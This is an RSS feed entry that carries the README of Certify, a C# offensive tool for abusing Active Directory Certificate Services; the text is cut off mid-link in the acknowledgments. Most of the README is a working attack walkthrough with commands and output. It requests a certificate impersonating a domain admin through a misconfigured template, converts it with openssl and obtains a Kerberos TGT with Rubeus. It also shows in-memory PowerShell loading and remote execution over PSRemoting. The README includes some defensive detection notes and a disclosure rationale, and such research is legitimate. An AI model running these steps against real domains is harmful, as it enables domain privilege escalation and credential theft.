<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-11-25T01:30:45Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>GhostPack/Certify</title>
    <updated>2022-11-25T01:30:45Z</updated>
    <id>tag:github.com,2022-11-25:/GhostPack/Certify</id>
    <link href="https://github.com/GhostPack/Certify" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Active Directory certificate abuse.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Certify&lt;/h1&gt; &#xA;&lt;p&gt;Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;@tifkin_&lt;/a&gt; are the primary authors of Certify and the the associated AD CS research (&lt;a href=&#34;https://posts.specterops.io/certified-pre-owned-d95910965cd2&#34;&gt;blog&lt;/a&gt; and &lt;a href=&#34;https://specterops.io/assets/resources/Certified_Pre-Owned.pdf&#34;&gt;whitepaper&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#certify&#34;&gt;Certify&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#usage&#34;&gt;Usage&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#using-requested-certificates&#34;&gt;Using Requested Certificates&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#example-walkthrough&#34;&gt;Example Walkthrough&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#defensive-considerations&#34;&gt;Defensive Considerations&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#compile-instructions&#34;&gt;Compile Instructions&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#sidenote-running-certify-through-powershell&#34;&gt;Sidenote: Running Certify Through PowerShell&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#sidenote-sidenote-running-certify-over-psremoting&#34;&gt;Sidenote Sidenote: Running Certify Over PSRemoting&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#reflections&#34;&gt;Reflections&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#acknowledgments&#34;&gt;Acknowledgments&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Tools&amp;gt;Certify.exe&#xA;&#xA;   _____          _   _  __&#xA;  / ____|        | | (_)/ _|&#xA; | |     ___ _ __| |_ _| |_ _   _&#xA; | |    / _ \ &#39;__| __| |  _| | | |&#xA; | |___|  __/ |  | |_| | | | |_| |&#xA;  \_____\___|_|   \__|_|_|  \__, |&#xA;                             __/ |&#xA;                            |___./&#xA;  v1.0.0&#xA;&#xA;&#xA;  Find information about all registered CAs:&#xA;&#xA;    Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]&#xA;&#xA;&#xA;  Find all enabled certificate templates:&#xA;&#xA;    Certify.exe find [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]&#xA;&#xA;  Find vulnerable/abusable certificate templates using default low-privileged groups:&#xA;&#xA;    Certify.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]&#xA;&#xA;  Find vulnerable/abusable certificate templates using all groups the current user context is a part of:&#xA;&#xA;    Certify.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]&#xA;&#xA;  Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:&#xA;&#xA;    Certify.exe find /enrolleeSuppliesSubject [/ca:SERVER\ca-name| /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]&#xA;&#xA;  Find enabled certificate templates capable of client authentication:&#xA;&#xA;    Certify.exe find /clientauth [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]&#xA;&#xA;  Find all enabled certificate templates, display all of their permissions, and don&#39;t display the banner message:&#xA;&#xA;    Certify.exe find /showAllPermissions /quiet [/ca:COMPUTER\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]&#xA;&#xA;  Find all enabled certificate templates and output to a json file:&#xA;&#xA;    Certify.exe find /json /outfile:C:\Temp\out.json [/ca:COMPUTER\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]&#xA;&#xA;&#xA;  Enumerate access control information for PKI objects:&#xA;&#xA;    Certify.exe pkiobjects [/domain:domain.local] [/showAdmins] [/quiet]&#xA;&#xA;&#xA;  Request a new certificate using the current user context:&#xA;&#xA;    Certify.exe request /ca:SERVER\ca-name [/subject:X] [/template:Y] [/install]&#xA;&#xA;  Request a new certificate using the current machine context:&#xA;&#xA;    Certify.exe request /ca:SERVER\ca-name /machine [/subject:X] [/template:Y] [/install]&#xA;&#xA;  Request a new certificate using the current user context but for an alternate name (if supported):&#xA;&#xA;    Certify.exe request /ca:SERVER\ca-name /template:Y /altname:USER&#xA;&#xA;  Request a new certificate on behalf of another user, using an enrollment agent certificate:&#xA;&#xA;    Certify.exe request /ca:SERVER\ca-name /template:Y /onbehalfof:DOMAIN\USER /enrollcert:C:\Temp\enroll.pfx [/enrollcertpw:CERT_PASSWORD]&#xA;&#xA;&#xA;  Download an already requested certificate:&#xA;&#xA;    Certify.exe download /ca:SERVER\ca-name /id:X [/install] [/machine]&#xA;&#xA;&#xA;&#xA;Certify completed in 00:00:00.0200190&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Using Requested Certificates&lt;/h3&gt; &#xA;&lt;p&gt;Certificates can be transformed to .pfx&#39;s usable with Certify with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;openssl pkcs12 -in cert.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Certificates can be used with Rubeus to request a TGT with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Rubeus.exe asktgt /user:X /certificate:C:\Temp\cert.pfx /password:&amp;lt;CERT_PASSWORD&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Example Walkthrough&lt;/h2&gt; &#xA;&lt;p&gt;First, use Certify.exe to see if there are any vulnerable templates:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;Certify.exe find /vulnerable&#xA;   _____          _   _  __&#xA;  / ____|        | | (_)/ _|&#xA; | |     ___ _ __| |_ _| |_ _   _&#xA; | |    / _ \ &#39;__| __| |  _| | | |&#xA; | |___|  __/ |  | |_| | | | |_| |&#xA;  \_____\___|_|   \__|_|_|  \__, |&#xA;                             __/ |&#xA;                            |___./&#xA;  v1.0.0&#xA;&#xA;[*] Action: Find certificate templates&#xA;[*] Using the search base &#39;CN=Configuration,DC=theshire,DC=local&#39;&#xA;[*] Restricting to CA name : dc.theshire.local\theshire-DC-CA&#xA;&#xA;[*] Listing info about the Enterprise CA &#39;theshire-DC-CA&#39;&#xA;&#xA;    Enterprise CA Name            : theshire-DC-CA&#xA;    DNS Hostname                  : dc.theshire.local&#xA;    FullName                      : dc.theshire.local\theshire-DC-CA&#xA;    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED&#xA;    Cert SubjectName              : CN=theshire-DC-CA, DC=theshire, DC=local&#xA;    Cert Thumbprint               : 187D81530E1ADBB6B8B9B961EAADC1F597E6D6A2&#xA;    Cert Serial                   : 14BFC25F2B6EEDA94404D5A5B0F33E21&#xA;    Cert Start Date               : 1/4/2021 10:48:02 AM&#xA;    Cert End Date                 : 1/4/2026 10:58:02 AM&#xA;    Cert Chain                    : CN=theshire-DC-CA,DC=theshire,DC=local&#xA;    UserSpecifiedSAN              : Disabled&#xA;    CA Permissions                :&#xA;      Owner: BUILTIN\Administrators        S-1-5-32-544&#xA;&#xA;      Access Rights                                     Principal&#xA;&#xA;      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544&#xA;      Allow  ManageCA, ManageCertificates               THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;      Allow  ManageCA, Read, Enroll                     THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513&#xA;        [!] Low-privileged principal has ManageCA rights!&#xA;      Allow  Enroll                                     THESHIRE\Domain Computers     S-1-5-21-937929760-3187473010-80948926-515&#xA;      Allow  ManageCA, ManageCertificates               THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;      Allow  ManageCertificates, Enroll                 THESHIRE\certmanager          S-1-5-21-937929760-3187473010-80948926-1605&#xA;      Allow  ManageCA, Enroll                           THESHIRE\certadmin            S-1-5-21-937929760-3187473010-80948926-1606&#xA;    Enrollment Agent Restrictions :&#xA;      Everyone                      S-1-1-0&#xA;        Template : &amp;lt;All&amp;gt;&#xA;        Targets  :&#xA;          Everyone                  S-1-1-0&#xA;&#xA;      Everyone                      S-1-1-0&#xA;        Template : User&#xA;        Targets  :&#xA;          Everyone                  S-1-1-0&#xA;&#xA;Vulnerable Certificates Templates :&#xA;&#xA;    CA Name                         : dc.theshire.local\theshire-DC-CA&#xA;    Template Name                   : User2&#xA;    Validity Period                 : 2 years&#xA;    Renewal Period                  : 6 weeks&#xA;    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH&#xA;    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS, AUTO_ENROLLMENT&#xA;    Authorized Signatures Required  : 0&#xA;    pkiextendedkeyusage             : Client Authentication, Smart Card Logon&#xA;    Permissions&#xA;      Enrollment Permissions&#xA;        Enrollment Rights           : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;        All Extended Rights         : THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513&#xA;      Object Control Permissions&#xA;        Owner                       : THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000&#xA;        Full Control Principals     : THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513&#xA;        WriteOwner Principals       : NT AUTHORITY\Authenticated UsersS-1-5-11&#xA;                                      THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;        WriteDacl Principals        : NT AUTHORITY\Authenticated UsersS-1-5-11&#xA;                                      THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;        WriteProperty Principals    : NT AUTHORITY\Authenticated UsersS-1-5-11&#xA;                                      THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;&#xA;    CA Name                         : dc.theshire.local\theshire-DC-CA&#xA;    Template Name                   : VulnTemplate&#xA;    Validity Period                 : 3 years&#xA;    Renewal Period                  : 6 weeks&#xA;    msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT&#xA;    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS&#xA;    Authorized Signatures Required  : 0&#xA;    pkiextendedkeyusage             : Client Authentication, Encrypting File System, Secure Email&#xA;    Permissions&#xA;      Enrollment Permissions&#xA;        Enrollment Rights           : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Domain Users         S-1-5-21-937929760-3187473010-80948926-513&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;      Object Control Permissions&#xA;        Owner                       : THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000&#xA;        WriteOwner Principals       : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;                                      THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000&#xA;        WriteDacl Principals        : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;                                      THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000&#xA;        WriteProperty Principals    : THESHIRE\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512&#xA;                                      THESHIRE\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519&#xA;                                      THESHIRE\localadmin           S-1-5-21-937929760-3187473010-80948926-1000&#xA;&#xA;&#xA;&#xA;Certify completed in 00:00:00.6548319&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Given the above results, we have the three following issues:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;code&gt;THESHIRE\Domain Users&lt;/code&gt; have &lt;strong&gt;ManageCA&lt;/strong&gt; permissions over the &lt;code&gt;dc.theshire.local\theshire-DC-CA&lt;/code&gt; CA (ESC7) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This means that the EDITF_ATTRIBUTESUBJECTALTNAME2 flag can be flipped on the CA by anyone.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;THESHIRE\Domain Users&lt;/code&gt; have full control over the &lt;strong&gt;User2&lt;/strong&gt; template (ESC4) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This means that anyone can flip the &lt;strong&gt;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT&lt;/strong&gt; flag on this template and remove the &lt;strong&gt;PEND_ALL_REQUESTS&lt;/strong&gt; issuance requirement.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;THESHIRE\Domain Users&lt;/code&gt; can enroll in the &lt;strong&gt;VulnTemplate&lt;/strong&gt; template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set (ESC1) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA).&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;We&#39;ll show the abuse of scenario 3.&lt;/p&gt; &#xA;&lt;p&gt;Next, let&#39;s request a new certificate for this template/CA, specifying a DA &lt;code&gt;localadmin&lt;/code&gt; as the alternate principal:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:VulnTemplate /altname:localadmin&#xA;&#xA;   _____          _   _  __&#xA;  / ____|        | | (_)/ _|&#xA; | |     ___ _ __| |_ _| |_ _   _&#xA; | |    / _ \ &#39;__| __| |  _| | | |&#xA; | |___|  __/ |  | |_| | | | |_| |&#xA;  \_____\___|_|   \__|_|_|  \__, |&#xA;                             __/ |&#xA;                            |___./&#xA;  v1.0.0&#xA;&#xA;[*] Action: Request a Certificates&#xA;&#xA;[*] Current user context    : THESHIRE\harmj0y&#xA;[*] No subject name specified, using current context as subject.&#xA;&#xA;[*] Template                : VulnTemplate&#xA;[*] Subject                 : CN=harmj0y, OU=TestOU, DC=theshire, DC=local&#xA;[*] AltName                 : localadmin&#xA;&#xA;[*] Certificate Authority   : dc.theshire.local\theshire-DC-CA&#xA;&#xA;[*] CA Response             : The certificate had been issued.&#xA;[*] Request ID              : 337&#xA;&#xA;[*] cert.pem         :&#xA;&#xA;-----BEGIN RSA PRIVATE KEY-----&#xA;MIIEpAIBAAKCAQEAn8bKuwCYj8...&#xA;-----END RSA PRIVATE KEY-----&#xA;-----BEGIN CERTIFICATE-----&#xA;MIIGITCCBQmgAwIBAgITVQAAAV...&#xA;-----END CERTIFICATE-----&#xA;&#xA;&#xA;[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx&#xA;&#xA;&#xA;&#xA;Certify completed in 00:00:04.2127911&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Copy the &lt;code&gt; -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----&lt;/code&gt; section to a file on Linux/macOS, and run the openssl command to convert it to a .pfx. When prompted, don&#39;t enter a password:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;(base) laptop:~ harmj0y$ openssl pkcs12 -in cert.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx&#xA;Enter Export Password:&#xA;Verifying - Enter Export Password:&#xA;(base) laptop:~ harmj0y$&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the &lt;code&gt;altname&lt;/code&gt; user using Rubeus:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\cert.pfx&#xA;&#xA;   ______        _&#xA;  (_____ \      | |&#xA;   _____) )_   _| |__  _____ _   _  ___&#xA;  |  __  /| | | |  _ \| ___ | | | |/___)&#xA;  | |  \ \| |_| | |_) ) ____| |_| |___ |&#xA;  |_|   |_|____/|____/|_____)____/(___/&#xA;&#xA;  v1.6.1&#xA;&#xA;[*] Action: Ask TGT&#xA;&#xA;[*] Using PKINIT with etype rc4_hmac and subject: CN=harmj0y, OU=TestOU, DC=theshire, DC=local&#xA;[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;theshire.local\localadmin&#39;&#xA;[+] TGT request successful!&#xA;[*] base64(ticket.kirbi):&#xA;&#xA;      doIFujCCBbagAwIBBaEDAgEWooIExzCC...(snip)...&#xA;&#xA;  ServiceName           :  krbtgt/theshire.local&#xA;  ServiceRealm          :  THESHIRE.LOCAL&#xA;  UserName              :  localadmin&#xA;  UserRealm             :  THESHIRE.LOCAL&#xA;  StartTime             :  2/22/2021 2:06:51 PM&#xA;  EndTime               :  2/22/2021 3:06:51 PM&#xA;  RenewTill             :  3/1/2021 2:06:51 PM&#xA;  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable&#xA;  KeyType               :  rc4_hmac&#xA;  Base64(key)           :  Etb5WPFWeMbsZr2+FQQQMw==&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Defensive Considerations&lt;/h2&gt; &#xA;&lt;p&gt;Certify was released at Black Hat 2021 with our &lt;a href=&#34;https://www.blackhat.com/us-21/briefings/schedule/#certified-pre-owned-abusing-active-directory-certificate-services-23168&#34;&gt;&#34;Certified Pre-Owned: Abusing Active Directory Certificate Services&#34;&lt;/a&gt; talk.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://www.gdatasoftware.com/blog/2020/06/36164-introducing-the-typerefhash-trh&#34;&gt;TypeRefHash&lt;/a&gt; of the current Certify codebase is &lt;strong&gt;f9dbbfe2527e1164319350c0b0900c58be57a46c53ffef31699ed116a765995a&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The TypeLib GUID of Certify is &lt;strong&gt;64524ca5-e4d0-41b3-acc3-3bdbefd40c97&lt;/strong&gt;. This is reflected in the Yara rules currently in this repo.&lt;/p&gt; &#xA;&lt;p&gt;See our &lt;a href=&#34;https://specterops.io/assets/resources/Certified_Pre-Owned.pdf&#34;&gt;whitepaper&lt;/a&gt; for prevention and detection guidance.&lt;/p&gt; &#xA;&lt;h2&gt;Compile Instructions&lt;/h2&gt; &#xA;&lt;p&gt;We are not planning on releasing binaries for Certify, so you will have to compile yourself :)&lt;/p&gt; &#xA;&lt;p&gt;Certify has been built against .NET 4.0 and is compatible with &lt;a href=&#34;https://visualstudio.microsoft.com/vs/community/&#34;&gt;Visual Studio 2019 Community Edition&lt;/a&gt;. Simply open up the project .sln, choose &#34;Release&#34;, and build.&lt;/p&gt; &#xA;&lt;h3&gt;Sidenote: Running Certify Through PowerShell&lt;/h3&gt; &#xA;&lt;p&gt;If you want to run Certify in-memory through a PowerShell wrapper, first compile the Certify and base64-encode the resulting assembly:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Convert]::ToBase64String([IO.File]::ReadAllBytes(&#34;C:\Temp\Certify.exe&#34;)) | Out-File -Encoding ASCII C:\Temp\Certify.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Certify can then be loaded in a PowerShell script with the following (where &#34;aa...&#34; is replaced with the base64-encoded Certify assembly string):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(&#34;aa...&#34;))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Main() method and any arguments can then be invoked as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Certify.Program]::Main(&#34;find /vulnerable&#34;.Split())&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Sidenote Sidenote: Running Certify Over PSRemoting&lt;/h4&gt; &#xA;&lt;p&gt;Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Certify has a function to help with that.&lt;/p&gt; &#xA;&lt;p&gt;If you follow the instructions in &lt;a href=&#34;https://raw.githubusercontent.com/GhostPack/Certify/main/#sidenote-running-Certify-through-powershell&#34;&gt;Sidenote: Running Certify Through PowerShell&lt;/a&gt; to create a Certify.ps1, append something like the following to the script:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[Certify.Program]::MainString(&#34;find /vulnerable&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should then be able to run Certify over PSRemoting with something like the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$s = New-PSSession dc.theshire.local&#xA;Invoke-Command -Session $s -FilePath C:\Temp\Certify.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Alternatively, Certify&#39;s &lt;code&gt;/outfile:C:\FILE.txt&lt;/code&gt; argument will redirect all output streams to the specified file.&lt;/p&gt; &#xA;&lt;h2&gt;Reflections&lt;/h2&gt; &#xA;&lt;p&gt;On the subject of public disclosure, we self-embargoed the release of our offensive tooling (Certify as well as &lt;a href=&#34;https://github.com/GhostPack/ForgeCert&#34;&gt;ForgeCert&lt;/a&gt;) for ~45 days after we published our &lt;a href=&#34;https://specterops.io/assets/resources/Certified_Pre-Owned.pdf&#34;&gt;whitepaper&lt;/a&gt; in order to give organizations a chance to get a grip on the issues surrounding Active Directory Certificate Services. We also preemptively released some Yara rules/IOCs for both projects and released the defensive-focused &lt;a href=&#34;https://github.com/GhostPack/PSPKIAudit&#34;&gt;PSPKIAudit&lt;/a&gt; PowerShell project along with the whitepaper. However, we have found that organizations and vendors have historically often not fixed issues or built detections for &#34;theoretical&#34; attacks until someone proves something is possible with a proof of concept.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgments&lt;/h2&gt; &#xA;&lt;p&gt;Certify used a few resources found online as reference and inspiration:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20200131060008/http://geekswithblogs.net/shaunxu/archive/2012/01/13/working-with-active-directory-certificate-service-via-c.aspx&#34;&gt;This post&lt;/a&gt; on requesting certificates from C#.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/jimmyca15/8f737f5f0bcf347450bd6d6bf34f4f7e#file-certificate-cs-L86-L101&#34;&gt;This gist&lt;/a&gt; for SAN specification.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/a/23739932&#34;&gt;This StackOverflow post&lt;/a&gt; on exporting private keys.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.sysadmins.lv/blog-en/how-to-convert-pkiexirationperiod-and-pkioverlapperiod-active-directory-attributes.aspx&#34;&gt;This PKISolutions post&lt;/a&gt; on converting pkiExpirationPeriod.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csra/b497b1e1-a84c-40c8-9379-524193176fad&#34;&gt;This section of MS-CSRA&lt;/a&gt; describing enrollment agent security DACLs.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The AD CS work was built on work from a number of others. The &lt;a href=&#34;https://specterops.io/assets/resources/Certified_Pre-Owned.pdf&#34;&gt;whitepaper&lt;/a&gt; has a complete treatment, but to summarize:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/gentilkiwi/&#34;&gt;Benjamin Delpy&lt;/a&gt; for his &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files&#34;&gt;extensive work&lt;/a&gt; on smart cards/certificates with Mimikatz and Kekeo.&lt;/li&gt; &#xA; &lt;li&gt;PKI Solutions for their &lt;a href=&#34;https://www.pkisolutions.com/thepkiblog/&#34;&gt;excellent posts on PKI in Active Directory&lt;/a&gt;, as well as their &lt;a href=&#34;https://github.com/PKISolutions/PSPKI&#34;&gt;PSPKI PowerShell module&lt;/a&gt;, which our auditing toolkit is based on.&lt;/li&gt; &#xA; &lt;li&gt;The &#34;&lt;a href=&#34;https://www.microsoftpressstore.com/store/windows-server-2008-pki-and-certificate-security-9780735640788&#34;&gt;Windows Server 2008 – PKI and Certificate Security&lt;/a&gt;&#34; book by Brian Komar.&lt;/li&gt; &#xA; &lt;li&gt;The following open technical specifications provided by Microsoft: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;[MS-CERSOD]: Certificate Services Protocols Overview&lt;/li&gt; &#xA;   &lt;li&gt;[MS-CRTD]: Certificate Templates Structure&lt;/li&gt; &#xA;   &lt;li&gt;[MS-CSRA]: Certificate Services Remote Administration Protocol&lt;/li&gt; &#xA;   &lt;li&gt;[MS-ICPR]: ICertPassage Remote Protocol&lt;/li&gt; &#xA;   &lt;li&gt;[MS-WCCE]: Windows Client Certificate Enrollment Protocol&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cfalta/PoshADCS&#34;&gt;Christoph Falta&#39;s GitHub repo&lt;/a&gt; which covers some details on attacking certificate templates, including virtual smart cards as well as some ideas on ACL based abuses.&lt;/li&gt; &#xA; &lt;li&gt;CQURE&#39;s &#34;&lt;a href=&#34;https://cqureacademy.com/blog/enhanced-key-usage&#34;&gt;The tale of Enhanced Key (mis)Usage&lt;/a&gt;&#34; post which covers some Subject Alternative Name abuses.&lt;/li&gt; &#xA; &lt;li&gt;Keyfactor&#39;s 2016 post &#34;&lt;a href=&#34;https://www.keyfactor.com/blog/hidden-dangers-certificate-subject-alternative-names-sans/&#34;&gt;Hidden Dangers: Certificate Subject Alternative Names (SANs)&lt;/a&gt;&#34;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/elkement&#34;&gt;@Elkement&lt;/a&gt;&#39;s posts &#34;&lt;a 